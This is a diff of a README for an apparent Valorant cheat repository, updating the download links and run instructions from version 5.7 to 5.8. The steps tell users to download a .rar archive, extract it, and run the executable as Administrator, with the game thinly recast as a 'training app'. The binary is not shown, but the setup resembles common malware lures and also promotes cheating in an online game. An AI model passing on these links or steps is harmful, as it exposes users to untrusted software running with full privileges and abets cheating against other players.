@@ -12,7 +12,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/Valorant5.7/Valorant5.7.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/Valorant5.8/Valorant5.8.rar)
 
 </div>
 
@@ -53,11 +53,11 @@
 
 ---
 
-## [🔧 Installation](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/Valorant5.7/Valorant5.7.rar)
+## [🔧 Installation](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/Valorant5.8/Valorant5.8.rar)
 
 1. **Download** the latest release from the [Releases](../../releases) page.
 2. **Extract** the archive to a folder on your desktop.
-3. **Run** `Valorant5.7.exe` as **Administrator**.
+3. **Run** `Valorant5.8.exe` as **Administrator**.
 4. **Launch** your training app and press `INSERT` to toggle the menu.
 
 ---
